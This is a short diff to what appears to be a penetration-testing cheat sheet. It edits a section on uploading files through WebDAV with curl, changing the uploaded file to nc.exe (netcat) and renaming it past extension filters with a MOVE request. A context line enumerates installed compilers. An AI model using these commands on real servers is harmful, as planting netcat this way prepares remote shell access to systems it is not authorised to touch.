@@ -343,7 +343,7 @@ Available compilers `dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 
 
 ### Upload files using cUrl with WebDAV
 ```
-curl -T accesschk.exe http://targetIP/nc.txt
+curl -T nc.exe http://targetIP/nc.txt
 curl -X MOVE -v -H "Destination:http://targetIP/nc.exe" http://targetIP/nc.txt
 ```
 
